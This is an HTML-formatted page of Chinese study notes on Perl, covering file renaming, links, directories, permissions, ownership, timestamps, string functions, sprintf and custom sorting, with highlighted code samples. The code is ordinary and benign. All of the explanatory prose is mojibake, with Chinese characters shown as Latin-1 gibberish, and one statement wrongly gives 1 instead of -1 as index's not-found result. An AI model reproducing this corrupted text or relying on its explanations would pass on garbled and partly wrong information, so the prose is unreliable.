class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">rename</span> <span class="hljs-string">&#x27;old&#x27;</span>, <span class="hljs-string">&#x27;new&#x27;</span>;<br></code></pre></td></tr></table></figure><p>å¯ä»¥ç§»åˆ°ä¸åŒç›®å½•:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">rename</span> <span class="hljs-string">&#x27;over_there/some/place/some_file&#x27;</span>, <span class="hljs-string">&#x27;some_file&#x27;</span>;<br></code></pre></td></tr></table></figure><p>å¯ä»¥ä¸ç”¨é€—å·è€Œç”¨ <code>=&gt;</code>:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">rename</span> <span class="hljs-string">&#x27;over_there/some/place/some_file&#x27;</span> =&gt; <span class="hljs-string">&#x27;some_file&#x27;</span>;<br></code></pre></td></tr></table></figure><p>æ‰¹é‡æŠŠåç§°ä»¥ <code>.old</code> ç»“å°¾çš„æ–‡ä»¶æ”¹åä¸º <code>.new</code> ç»“å°¾:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">foreach</span> <span class="hljs-keyword">my</span> $file (<span class="hljs-keyword">glob</span> <span class="hljs-string">&quot;*.old&quot;</span>) &#123;<br>    <span class="hljs-keyword">my</span> $newfile = $file;<br>    $newfile =~ <span class="hljs-regexp">s/\.old$/.new/</span>;<br>    <span class="hljs-keyword">if</span> (-e $newfile) &#123;<br>        <span class="hljs-keyword">warn</span> <span class="hljs-string">&quot;can&#x27;t rename $file to $newfile: $newfile exists\n&quot;</span>;<br>    &#125; <span class="hljs-keyword">elsif</span> (<span class="hljs-keyword">rename</span> $file =&gt; $newfile) &#123;<br><br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">warn</span> <span class="hljs-string">&quot;rename $file to $newfile failed: $!\n&quot;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="é“¾æ¥ä¸æ–‡ä»¶"><a href="#é“¾æ¥ä¸æ–‡ä»¶" class="headerlink" title="é“¾æ¥ä¸æ–‡ä»¶"></a>é“¾æ¥ä¸æ–‡ä»¶</h3><p>ç›®å½•æ˜¯ä¸€ç§ç”±ç³»ç»Ÿç®¡ç†çš„ç‰¹æ®Šæ–‡ä»¶, åŸºæœ¬ä¸Šç›®å½•æ˜¯ä¸€ä»½æ–‡ä»¶åå’Œç›¸åº” inode ç¼–å·çš„å¯¹ç…§è¡¨. <code>ls -i</code> å¯æŸ¥çœ‹ inode.</p><p>åˆ¤æ–­ä¸€ä¸ª inode æ˜¯å¦å¯ç”¨, åˆ©ç”¨ inode çš„é“¾æ¥æ•° (link count). å¦‚æœ inode å¹¶æœªåœ¨ä»»ä½•ç›®å½•é‡Œå‡ºç°, å®ƒçš„é“¾æ¥æ•°å°±ä¸€å®šæ˜¯é›¶.</p><p>æ‰€æœ‰é“¾æ¥æ•°ä¸ºé›¶çš„ inode éƒ½å¯ä»¥ç”¨æ¥å­˜æ”¾æ–°æ–‡ä»¶.</p><p>ä»»ä½•ç›®å½•çš„é“¾æ¥æ•°éƒ½è‡³å°‘æ˜¯ 2 :ä¸€ä¸ªä½äºå®ƒçš„ä¸Šå±‚ç›®å½•çš„åˆ—è¡¨é‡Œ, å¦ä¸€ä¸ªä½äºå®ƒæœ¬èº«çš„åˆ—è¡¨é‡Œ.</p><p>åˆ©ç”¨ Perl ä¸­çš„ <code>link</code> å‡½æ•°å»ºç«‹æ–°çš„é“¾æ¥:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">link</span> <span class="hljs-string">&#x27;chicken&#x27;</span>, <span class="hljs-string">&#x27;egg&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-keyword">warn</span> <span class="hljs-string">&quot;can&#x27;t link chicken to egg: $!&quot;</span>;<br></code></pre></td></tr></table></figure><p>å’Œå‘½ä»¤è¡Œä¸‹çš„ <code>ln chicken egg</code> æ•ˆæœç±»ä¼¼. è¿™æ˜¯ç¡¬é“¾æ¥. å¦‚æœåˆ é™¤äº† chichen æ–‡ä»¶, æ–‡ä»¶é‡Œçš„æ•°æ®å¹¶ä¸ä¼šä¸¢å¤±, è¿˜å¯ä»¥ç”¨ egg è¿™ä¸ªæ–‡ä»¶åæ¥è®¿é—®.</p><p>ç›®å½•åˆ—è¡¨çš„ç¡¬é“¾æ¥è¿˜æœ‰ä¸€æ¡è§„å®š: åœ¨ç›®å½•åˆ—è¡¨ä¸­æ‰€æœ‰ inode æŒ‡å‘çš„æ–‡ä»¶éƒ½å¿…é¡»åœ¨åŒä¸€ä¸ªæŒ‚è½½å·ä¸­.</p><p><code>rename</code> è™½ç„¶å¯ä»¥å°†æ–‡ä»¶ç§»åˆ°åˆ«çš„ç›®å½•é‡Œ, ä½†æ˜¯æ¥æºå’Œç›®çš„åœ°å¿…é¡»ä½äºåŒä¸€ä¸ªæ–‡ä»¶ç³»ç»Ÿ (æŒ‚è½½å·) ä¸Š.</p><p>è½¯é“¾æ¥ (symbolic link):</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">symlink</span> <span class="hljs-string">&#x27;dodgson&#x27;</span>, <span class="hljs-string">&#x27;carroll&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-keyword">warn</span> <span class="hljs-string">&quot;can&#x27;t symlink dodgson to carroll: $!&quot;</span>;<br></code></pre></td></tr></table></figure><p>ç¬¦å·é“¾æ¥æ˜¯åˆ›å»ºäº†æ–°çš„ inode.</p><p>å–å¾—ç¬¦å·é“¾æ¥æŒ‡å‘çš„ä½ç½®, ä½¿ç”¨ <code>readlink</code> å‡½æ•°:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> $where = <span class="hljs-keyword">readlink</span> <span class="hljs-string">&#x27;carroll&#x27;</span>;<br><br><span class="hljs-keyword">my</span> $perl = <span class="hljs-keyword">readlink</span> <span class="hljs-string">&#x27;/usr/local/bin/perl&#x27;</span>;<br></code></pre></td></tr></table></figure><p>ä¸¤ç§é“¾æ¥éƒ½å¯ä»¥ç”¨ <code>unlink</code> ç§»é™¤.</p><h2 id="åˆ›å»ºå’Œåˆ é™¤ç›®å½•"><a href="#åˆ›å»ºå’Œåˆ é™¤ç›®å½•" class="headerlink" title="åˆ›å»ºå’Œåˆ é™¤ç›®å½•"></a>åˆ›å»ºå’Œåˆ é™¤ç›®å½•</h2><p>ä½¿ç”¨ <code>mkdir</code> ç›®å½•åˆ›å»º:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">mkdir</span> <span class="hljs-string">&#x27;fred&#x27;</span>, <span class="hljs-number">0755</span> <span class="hljs-keyword">or</span> <span class="hljs-keyword">warn</span> <span class="hljs-string">&quot;Cannot make fred directory: $!&quot;</span>;<br></code></pre></td></tr></table></figure><p>æ³¨æ„è¿™é‡Œç”¨çš„æ˜¯å…«è¿›åˆ¶æ•°.</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> $name = <span class="hljs-string">&#x27;fred&#x27;</span>;<br><span class="hljs-keyword">my</span> $permissions = <span class="hljs-string">&quot;0755&quot;</span>;<br><span class="hljs-keyword">mkdir</span> $name, <span class="hljs-keyword">oct</span>($permissions) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span> <span class="hljs-string">&quot;Cannot create $name: $!&quot;</span>;<br></code></pre></td></tr></table></figure><p>ç§»é™¤ç©ºç›®å½•ç›´æ¥ç”¨ <code>rmdir</code>, æ¯æ¬¡è°ƒç”¨åªèƒ½åˆ é™¤ä¸€ä¸ªç›®å½•:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">foreach</span> <span class="hljs-keyword">my</span> $dir <span class="hljs-string">qw(fred barbey betty)</span> &#123;<br>    <span class="hljs-keyword">rmdir</span> $dir <span class="hljs-keyword">or</span> <span class="hljs-keyword">warn</span> <span class="hljs-string">&quot;Cannot rmdir $dir: $!\n&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>åˆ é™¤éç©ºç›®å½•ä¹‹å‰, å…ˆç”¨ <code>unlink</code> åˆ é™¤ç›®å½•ä¸­çš„å†…å®¹.</p><p>è¿›ç¨‹å·, å­˜åœ¨ <code>$$</code> ä¸­.</p><p>å¯ä»¥å‚è€ƒ <code>File::Path</code> æ¨¡å—ä¸­çš„ <code>rmtree</code> å‡½æ•°.</p><h2 id="ä¿®æ”¹æƒé™"><a href="#ä¿®æ”¹æƒé™" class="headerlink" title="ä¿®æ”¹æƒé™"></a>ä¿®æ”¹æƒé™</h2><p>ä½¿ç”¨ perl ä¸­çš„ <code>chmod</code> å‡½æ•°:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">chmod</span> <span class="hljs-number">0755</span>, <span class="hljs-string">&#x27;fred&#x27;</span>, <span class="hljs-string">&#x27;barney&#x27;</span>;<br></code></pre></td></tr></table></figure><p><code>chmod</code> ä¼šè¿”å›æˆåŠŸæ›´æ”¹çš„æ¡ç›®æ•°é‡.</p><p>å®‰è£… <code>File::chmod</code> æ¨¡å—å¯ä»¥æ”¯æŒç¬¦å·è¡¨ç¤ºçš„æƒé™å€¼.</p><h2 id="ä¿®æ”¹éš¶å±å…³ç³»"><a href="#ä¿®æ”¹éš¶å±å…³ç³»" class="headerlink" title="ä¿®æ”¹éš¶å±å…³ç³»"></a>ä¿®æ”¹éš¶å±å…³ç³»</h2><p>éœ€è¦ä½¿ç”¨æ•°å­—å½¢å¼çš„ç”¨æˆ·æ ‡è¯†ç¬¦åŠç»„æ ‡è¯†ç¬¦:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> $user = <span class="hljs-number">1004</span>;<br><span class="hljs-keyword">my</span> $group = <span class="hljs-number">100</span>;<br><span class="hljs-keyword">chown</span> $user, $group, <span class="hljs-keyword">glob</span> <span class="hljs-string">&#x27;*.o&#x27;</span>;<br></code></pre></td></tr></table></figure><p>å¯ä»¥ä½¿ç”¨ <code>getpwnam</code> å‡½æ•°å°†ç”¨æˆ·åè½¬æ¢æˆç”¨æˆ·ç¼–å·, <code>getgrnam</code> æŠŠç”¨æˆ·ç»„åè½¬æ¢æˆç»„ç¼–å·:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">defined</span>(<span class="hljs-keyword">my</span> $user = <span class="hljs-keyword">getpwnam</span> <span class="hljs-string">&#x27;merlyn&#x27;</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span> <span class="hljs-string">&#x27;bad user&#x27;</span>;<br><span class="hljs-keyword">defined</span>(<span class="hljs-keyword">my</span> $group = <span class="hljs-keyword">getgrnam</span> <span class="hljs-string">&#x27;users&#x27;</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span> <span class="hljs-string">&#x27;bad group&#x27;</span>;<br><span class="hljs-keyword">chown</span> $user, $group, <span class="hljs-keyword">glob</span> <span class="hljs-string">&#x27;/home/merlyn/*&#x27;</span>;<br></code></pre></td></tr></table></figure><p><code>chown</code> ä¼šè¿”å›å—å½±å“çš„æ–‡ä»¶æ•°é‡.</p><h2 id="ä¿®æ”¹æ—¶é—´æˆ³"><a href="#ä¿®æ”¹æ—¶é—´æˆ³" class="headerlink" title="ä¿®æ”¹æ—¶é—´æˆ³"></a>ä¿®æ”¹æ—¶é—´æˆ³</h2><p>ä½¿ç”¨ <code>utime</code> å‡½æ•°, å‰ä¸¤ä¸ªå‚æ•°æ˜¯æ–°çš„è®¿é—®æ—¶é—´å’Œæ›´æ”¹æ—¶é—´, å…¶ä½™å‚æ•°æ˜¯è¦ä¿®æ”¹æ—¶é—´æˆ³çš„æ–‡ä»¶ååˆ—è¡¨. æ—¶é—´æ ¼å¼é‡‡ç”¨çš„æ˜¯å†…éƒ¨æ—¶é—´æˆ³çš„æ ¼å¼ (stat å’Œ lstat å‡½æ•°).</p><p>å¦‚:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> $now = <span class="hljs-keyword">time</span>;<br><span class="hljs-keyword">my</span> $ago = $now - <span class="hljs-number">24</span> * <span class="hljs-number">60</span> * <span class="hljs-number">60</span>;<br><span class="hljs-keyword">utime</span> $now, $ago, <span class="hljs-keyword">glob</span> <span class="hljs-string">&#x27;*&#x27;</span>;<br></code></pre></td></tr></table></figure><h1 id="ç¬¬åå››ç« -å­—ç¬¦ä¸²ä¸æ’åº"><a href="#ç¬¬åå››ç« -å­—ç¬¦ä¸²ä¸æ’åº" class="headerlink" title="ç¬¬åå››ç«  å­—ç¬¦ä¸²ä¸æ’åº"></a>ç¬¬åå››ç«  å­—ç¬¦ä¸²ä¸æ’åº</h1><h2 id="ç”¨-index-æŸ¥æ‰¾å­å­—ç¬¦ä¸²"><a href="#ç”¨-index-æŸ¥æ‰¾å­å­—ç¬¦ä¸²" class="headerlink" title="ç”¨ index æŸ¥æ‰¾å­å­—ç¬¦ä¸²"></a>ç”¨ index æŸ¥æ‰¾å­å­—ç¬¦ä¸²</h2><p>æ‰¾å‡ºå­å­—ç¬¦ä¸²åœ¨ä¸»å­—ç¬¦ä¸²ä¸­çš„ç›¸å¯¹ä½ç½®:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">$where = <span class="hljs-keyword">index</span>($big, $small);<br></code></pre></td></tr></table></figure><p>è¿”å›å€¼æ˜¯æ•´æ•°, è¡¨ç¤ºé¦–æ¬¡å‡ºç°çš„ç¬¬ä¸€ä¸ªå­—ç¬¦çš„ä½ç½®. ä»é›¶ç®—èµ·. æ— æ³•æ‰¾åˆ°, å°±ä¼šè¿”å› 1.</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> $stuff = <span class="hljs-string">&quot;Howdy world!&quot;</span>;<br><span class="hljs-keyword">my</span> $where = <span class="hljs-keyword">index</span>($stuff, <span class="hljs-string">&quot;wor&quot;</span>);<br></code></pre></td></tr></table></figure><p>è¿”å› 6.</p><p>å¯æŒ‡å®šå¼€å§‹æŸ¥æ‰¾çš„ä½ç½® (ç¬¬ä¸‰ä¸ªå‚æ•°):</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> $stuff = <span class="hljs-string">&quot;Howdy world!&quot;</span>;<br><span class="hljs-keyword">my</span> $where = <span class="hljs-keyword">index</span>($stuff, <span class="hljs-string">&quot;wor&quot;</span>, <span class="hljs-number">2</span>);<br><br></code></pre></td></tr></table></figure><p><code>rindex</code> è¿”å›æœ€åå‡ºç°çš„ä½ç½®.</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> $last_slash = <span class="hljs-keyword">rindex</span>(<span class="hljs-string">&quot;/etc/passwd&quot;</span>, <span class="hljs-string">&quot;/&quot;</span>);<br></code></pre></td></tr></table></figure><p>ç»“æœä¸ºå››. å…¶ç¬¬ä¸‰ä¸ªå‚æ•°ç”¨æ¥é™å®šè¿”å›å€¼çš„ä¸Šé™.</p><h2 id="ç”¨-substr-æ“ä½œå­å­—ç¬¦ä¸²"><a href="#ç”¨-substr-æ“ä½œå­å­—ç¬¦ä¸²" class="headerlink" title="ç”¨ substr æ“ä½œå­å­—ç¬¦ä¸²"></a>ç”¨ substr æ“ä½œå­å­—ç¬¦ä¸²</h2><p>å¦‚:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> $part = <span class="hljs-keyword">substr</span>($string, $initial_position, $length);<br></code></pre></td></tr></table></figure><p>å¯ä¸ç”¨æŒ‡å®šé•¿åº¦, ç›´æ¥å–åˆ°ç»“å°¾å¦‚:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> $pebble = <span class="hljs-keyword">substr</span> <span class="hljs-string">&quot;Fred J. Flinstone&quot;</span>, <span class="hljs-number">13</span>;<br></code></pre></td></tr></table></figure><p>èµ·å§‹ä½ç½®ä¸ºè´Ÿæ•°è¡¨ç¤ºå€’æ•°.</p><p>å’Œ <code>index</code> é…åˆä½¿ç”¨:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> $long = <span class="hljs-string">&quot;some very very long string&quot;</span>;<br><span class="hljs-keyword">my</span> $right = <span class="hljs-keyword">substr</span>($long, <span class="hljs-keyword">index</span>($long, <span class="hljs-string">&quot;l&quot;</span>));<br></code></pre></td></tr></table></figure><p>ä¿®æ”¹å­—ç¬¦ä¸²è¢«é€‰å–çš„éƒ¨åˆ†:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> $string = <span class="hljs-string">&quot;Hello, world&quot;</span>;<br><span class="hljs-keyword">substr</span>($string, <span class="hljs-number">0</span>, <span class="hljs-number">5</span>) = <span class="hljs-string">&quot;Goodbye&quot;</span>;<br></code></pre></td></tr></table></figure><p>å˜é‡ <code>string</code> çš„å‰äº”ä¸ªå­—ç¬¦è¢«æ›¿æ¢ä¸ºåé¢çš„å­—ç¬¦ä¸², å³ â€œGoodbyeâ€. (ä¹Ÿå°±æ˜¯å‰äº”ä¸ªå­—ç¬¦è¢«é€‰å–å‡ºæ¥è¿›è¡Œå¤„ç†).</p><p>ç­‰åŒäº:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> $previous_value = <span class="hljs-keyword">substr</span>($string, <span class="hljs-number">0</span>, <span class="hljs-number">5</span>, <span class="hljs-string">&quot;Goodbye&quot;</span>);<br></code></pre></td></tr></table></figure><p>é…åˆ <code>=~</code> å’Œæ­£åˆ™è¡¨è¾¾å¼:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">substr</span>($string, -<span class="hljs-number">20</span>) =~ <span class="hljs-regexp">s/fred/barney/g</span>;<br></code></pre></td></tr></table></figure><h2 id="ç”¨-sprintf-æ ¼å¼åŒ–å­—ç¬¦ä¸²"><a href="#ç”¨-sprintf-æ ¼å¼åŒ–å­—ç¬¦ä¸²" class="headerlink" title="ç”¨ sprintf æ ¼å¼åŒ–å­—ç¬¦ä¸²"></a>ç”¨ sprintf æ ¼å¼åŒ–å­—ç¬¦ä¸²</h2><p>å…¶è¿”å›æ ¼å¼åŒ–ä¹‹åçš„å­—ç¬¦ä¸²è€Œä¸æ˜¯æ‰“å°.</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> $date_tag = <span class="hljs-keyword">sprintf</span> <span class="hljs-string">&quot;%4d/%02d/%02d %2d:%02d:%02d&quot;</span>, $ye, $mo, $da, $h, $m, $s;<br></code></pre></td></tr></table></figure><p>æ ¼å¼åŒ–å®šä¹‰ä¸­æ•°å­—å­—æ®µçš„å‰ç½®é›¶è¡¨ç¤ºå¿…è¦æ—¶ä¼šåœ¨æ•°å­—å‰è¡¥é›¶ä»¥ç¬¦åˆæŒ‡å®šçš„å®½åº¦.</p><h2 id="ç”¨-sprintf-æ ¼å¼åŒ–é‡‘é¢æ•°å­—"><a href="#ç”¨-sprintf-æ ¼å¼åŒ–é‡‘é¢æ•°å­—" class="headerlink" title="ç”¨ sprintf æ ¼å¼åŒ–é‡‘é¢æ•°å­—"></a>ç”¨ sprintf æ ¼å¼åŒ–é‡‘é¢æ•°å­—</h2><p>ä½¿ç”¨ <code>%.2f</code> è¿™ç§é™å®šå°æ•°ä½.</p><p>æœ‰ç”¨çš„ç¨‹åº:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-function"><span class="hljs-keyword">sub</span> <span class="hljs-title">big_money</span> </span>&#123;<br>    <span class="hljs-keyword">my</span> $number = <span class="hljs-keyword">sprintf</span> <span class="hljs-string">&quot;%.2f&quot;</span>, <span class="hljs-keyword">shift</span> @_;<br>    <span class="hljs-number">1</span> <span class="hljs-keyword">while</span> $number =~ <span class="hljs-regexp">s/^(-?\d+)(\d\d\d)/$1,$2/</span>;<br>    $number =~ <span class="hljs-regexp">s/^(-?)/$1\$/</span>;<br>    $number;<br>&#125;<br></code></pre></td></tr></table></figure><p>çœ‹ä¸æ‡‚å°±ç¿»ä¹¦.</p><h2 id="éåè¿›åˆ¶æ•°å­—å­—ç¬¦ä¸²çš„è½¬æ¢"><a href="#éåè¿›åˆ¶æ•°å­—å­—ç¬¦ä¸²çš„è½¬æ¢" class="headerlink" title="éåè¿›åˆ¶æ•°å­—å­—ç¬¦ä¸²çš„è½¬æ¢"></a>éåè¿›åˆ¶æ•°å­—å­—ç¬¦ä¸²çš„è½¬æ¢</h2><p>ä½¿ç”¨ <code>hex()</code> æˆ– <code>oct</code> è¿›è¡Œè½¬æ¢.</p><p><code>0b</code> å¼€å¤´è¡¨ç¤ºäºŒè¿›åˆ¶. <code>0x</code> å¼€å¤´è¡¨ç¤ºåå…­è¿›åˆ¶, å…¶ä»–çš„è¡¨ç¤ºä¸ºå…«è¿›åˆ¶.<br><img src="/../img/convery_to_disimal.png"></p><h2 id="é«˜çº§æ’åº"><a href="#é«˜çº§æ’åº" class="headerlink" title="é«˜çº§æ’åº"></a>é«˜çº§æ’åº</h2><p>Perl å…è®¸ä½ å»ºç«‹è‡ªå·±çš„ â€œæ’åºè§„åˆ™å­ç¨‹åº (sort-definition subroutine)â€.</p><p>æ’åºå­ç¨‹åºå¹¶ä¸éœ€è¦æ’åºè®¸å¤šå…ƒç´ , åªè¦èƒ½æ¯”è¾ƒä¸¤ä¸ªå…ƒç´ , Perl å°±æœ‰åŠæ³• (é€šè¿‡ä¸æ–­å’¨è¯¢æ’åºå­ç¨‹åº) è¿”å›æ’å¥½åºçš„æ•°æ®.</p><p>ç¤ºä¾‹:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-function"><span class="hljs-keyword">sub</span> <span class="hljs-title">by_number</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> ($a &lt; $b) &#123; -<span class="hljs-number">1</span> &#125; <span class="hljs-keyword">elsif</span> ($a &gt; $b) &#123; <span class="hljs-number">1</span> &#125; <span class="hljs-keyword">else</span> &#123; <span class="hljs-number">0</span> &#125;<br>&#125;<br><br><span class="hljs-keyword">my</span> @result = <span class="hljs-keyword">sort</span> by_number @some_numbers;<br></code></pre></td></tr></table></figure><p>ä½¿ç”¨æ’åºç”¨çš„å­ç¨‹åº, ä¸ç”¨åŠ  <code>&amp;</code>, æ”¾åœ¨ <code>sort</code> å…³é”®è¯å’Œå¾…æ’åºåˆ—è¡¨ä¹‹é—´.</p><p>æ’åºå­ç¨‹åºæ»¡è¶³çš„æ¡ä»¶æ˜¯:</p><ul><li>å¦‚æœ <code>$a</code> æ’åœ¨ <code>$b</code> ä¹‹å‰, è¿”å› <code>-1</code></li><li>å¦‚æœ <code>$b</code> æ’åœ¨ <code>$a</code> ä¹‹å‰, è¿”å› <code>1</code></li><li>æ— æ‰€è°“å…ˆåè¿”å› <code>0</code></li></ul><p>è®°å¿†æ–¹æ³•, <code>$a &lt; $b</code>, å¯ä»¥çœ‹æˆ <code>-1 0 1</code>, <code>$a</code> æ’åœ¨å‰é¢å°±æ˜¯å·¦è¾¹çš„ <code>-1</code>, <code>$b</code> æ’åœ¨å‰é¢å°±æ˜¯å³è¾¹çš„ <code>1</code>.</p><p>è®¸å¤šæ’åºå­ç¨‹åºçš„åç§°éƒ½æ˜¯ä»¥ <code>by_</code> å¼€å¤´çš„.</p><p>åœ¨æ’åºå­ç¨‹åºä¸­å¹¶ä¸éœ€è¦å»è®¾å®š <code>$a</code> å’Œ <code>$b</code>, äº¤ç»™ Perl å»å®Œæˆå°±å¥½.</p><p>ä½¿ç”¨é£èˆ¹æ“ä½œç¬¦ <code>&lt;=&gt;</code> ä¼šæ›´åŠ ç®€æ´, è¿™ä¸ªæ“ä½œç¬¦ä¼šæ¯”è¾ƒä¸¤ä¸ªæ•°å­—å¹¶è¿”å› <code>-1</code>, <code>0</code>, æˆ– <code>1</code>.</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-function"><span class="hljs-keyword">sub</span> <span class="hljs-title">by_number</span> </span>&#123; $a &lt;=&gt; $b &#125;<br></code></pre></td></tr></table></figure><p>é£èˆ¹æ“ä½œç¬¦åªèƒ½ç”¨æ¥æ¯”è¾ƒæ•°å­—.</p><p>ä½¿ç”¨ <code>cmp</code> æ¥æ¯”è¾ƒå­—ç¬¦ä¸². (è¿”å›ä¸‰ç§æ¯”è¾ƒç»“æœ) <code>cmp</code> æ‰€æä¾›çš„æ’åºä¸ sort é»˜è®¤çš„æ’åºè§„åˆ™ç›¸åŒ. (ASCII ç )</p><p>å¦‚:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-function"><span class="hljs-keyword">sub</span> <span class="hljs-title">by_code_point</span> </span>&#123; $a cmp $b &#125;<br><br><span class="hljs-keyword">my</span> @string = <span class="hljs-keyword">sort</span> by_code_point @any_strings;<br></code></pre></td></tr></table></figure><p>ä¸åŒºåˆ†å¤§å°å†™çš„æ’åº:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-function"><span class="hljs-keyword">sub</span> <span class="hljs-title">case_insensitive</span> </span>&#123; <span class="hljs-string">&quot;\L$a&quot;</span> cmp <span class="hljs-string">&quot;\L$b&quot;</span> &#125;<br></code></pre></td></tr></table></figure><p>ä¸€èˆ¬æ¥è¯´, å¯¹ Unicode å­—ç¬¦ä¸²æ’åº, éƒ½ä¼šå†™æˆ:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">use</span> Unicode::Normalize<br><br><span class="hljs-function"><span class="hljs-keyword">sub</span> <span class="hljs-title">equivalents</span> </span>&#123; NFKD($a) cmp NFKD($b) &#125;<br><br><span class="hljs-keyword">my</span> @string = <span class="hljs-keyword">sort</span> equivalents @any_strings;<br></code></pre></td></tr></table></figure><p>å‡ºäºæ€§èƒ½çš„è€ƒè™‘, <code>$a</code> å’Œ <code>$b</code> å¹¶éæ•°æ®é¡¹æ‹·è´, å®é™…ä¸Šå®ƒä»¬åªæ˜¯åŸå§‹åˆ—è¡¨å…ƒç´ çš„ä¸´æ—¶åˆ«å. åœ¨ä¸­é€”æ”¹å˜å®ƒä»¬çš„å€¼, ä¼šå¼„ä¹±åŸå§‹æ•°æ®.</p><p>æ›´ç®€å•çš„å†…åµŒæ’åºå­ç¨‹åº:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> @numbers = <span class="hljs-keyword">sort</span> &#123; $a &lt;=&gt; $b&#125; @some_numbers; 